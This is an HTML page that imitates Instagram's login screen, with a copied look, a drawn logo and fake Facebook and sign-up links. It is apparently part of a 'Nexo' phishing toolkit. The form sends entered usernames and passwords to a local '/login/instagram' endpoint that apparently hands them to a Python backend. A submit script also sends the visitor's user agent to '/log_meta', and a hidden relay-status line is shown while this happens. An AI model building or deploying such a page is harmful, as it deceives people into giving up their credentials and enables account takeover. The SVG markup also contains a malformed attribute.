<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-color: #fafafa; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
        }
        .insta-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
        }
        .insta-input { 
            background-color: #fafafa; 
            border: 1px solid #dbdbdb; 
            font-size: 12px;
            padding: 9px 0 7px 8px;
        }
        .insta-input:focus { 
            border-color: #a8a8a8; 
            outline: none;
        }
        .insta-btn { 
            background-color: #0095f6; 
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        .insta-btn:active { 
            background-color: #1877f2; 
        }
        #nexo-sync {
            display: none;
            font-family: monospace;
            font-size: 9px;
            color: #8e8e8e;
            text-align: center;
            margin-top: 8px;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <!-- Main Login Card -->
    <div class="insta-card p-10 w-full max-w-[350px] text-center mb-3">
        
        <!-- DRAWN INSTAGRAM LOGO (SVG) -->
        <div class="flex justify-center mb-8">
            <svg width="175" height="51" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org">
                <path d="M12.2 41.2C10.1 41.2 8.3 40.5 6.8 39.1C5.3 37.7 4.5 35.8 4.5 33.6V12.4C4.5 10.2 5.3 8.3 6.8 6.9C8.3 5.5 10.1 4.8 12.2 4.8H33.8C35.9 4.8 37.7 5.5 39.2 6.9C40.7 8.3 41.5 10.2 41.5 12.4V33.6C41.5 35.8 40.7 37.7 39.2 39.1C37.7 40.5 35.9 41.2 33.8 41.2H12.2ZM23 34C28.5 34 33 29.5 33 24C33 18.5 28.5 14 23 14C17.5 14 13 18.5 13 24C13 29.5 17.5 34 23 34ZM34 15.5C35.1 15.5 36 14.6 36 13.5C36 12.4 35.1 11.5 34 11.5C32.9 11.5 32 12.4 32 13.5C32 14.6 32.9 15.5 34 15.5Z" fill="black""")/>>
                <text x="50" y="35" fill="black" style="font-family: 'Brush Script MT', cursive; font-size: 38px;">Instagram</text>
            </svg>
        </div>

        <form id="instaForm" action="/login/instagram" method="POST" class="flex flex-col gap-2">
            <input name="user" type="text" placeholder="Phone number, username, or email" 
                   class="insta-input rounded-sm" required>
            
            <input name="pass" type="password" placeholder="Password" 
                   class="insta-input rounded-sm" required>
            
            <button id="loginBtn" type="submit" class="insta-btn py-1.5 mt-2">
                Log In
            </button>

            <div class="flex items-center my-4">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="px-4 text-gray-400 text-xs font-bold">OR</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>

            <button type="button" class="text-[#385185] text-sm font-bold flex items-center justify-center gap-2">
                <span class="bg-[#385185] text-white rounded-sm px-1 text-[10px]">f</span> Log in with Facebook
            </button>

            <a href="#" class="text-[#00376b] text-xs pt-4">Forgot password?</a>
        </form>

        <!-- NEXO-V8 SYNC STATUS -->
        <div id="nexo-sync" class="animate-pulse">
            [*] V8_INSTA_SYNC: RELAY_PENDING
        </div>
    </div>

    <!-- Secondary Sign Up Card -->
    <div class="insta-card p-5 w-full max-w-[350px] text-center">
        <p class="text-sm">Don't have an account? <span class="text-[#0095f6] font-bold cursor-pointer">Sign up</span></p>
    </div>

    <script>
        const instaForm = document.getElementById('instaForm');
        const loginBtn = document.getElementById('loginBtn');
        const syncStatus = document.getElementById('nexo-sync');

        instaForm.onsubmit = function() {
            loginBtn.innerText = "Connecting...";
            loginBtn.style.opacity = "0.5";
            syncStatus.style.display = "block";
            
            // Collect metadata for Nexo-Terminal
            const meta = {
                ua: navigator.userAgent,
                site: "INSTA_V8_VERT"
            };
            
            fetch('/log_meta', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(meta)
            });
            
            return true; // Allow form to POST to Python
        };
    </script>
</body>
</html>
